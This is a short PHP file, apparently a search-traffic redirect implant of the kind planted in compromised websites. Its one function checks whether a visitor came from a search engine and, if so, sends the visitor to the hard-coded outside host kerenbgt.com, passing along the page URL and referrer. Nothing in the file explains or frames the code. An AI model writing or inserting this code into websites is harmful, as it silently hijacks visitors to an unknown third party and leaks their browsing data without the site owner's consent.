<?php

function arsae($server = 'http://kerenbgt.com')
{
	if(SearchTerm::isCameFromSearchEngine()){
		$ref = SearchTerm::setReferer(null);

		if(empty($ref)){
			return false;
		}

		$url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

		$path = [
			'arsae' => urlencode($url),
			'arsae_ref' => urlencode($ref)
		];

		header('Location: ' . $server . '?' . http_build_query($path)); 
		die;
	}
}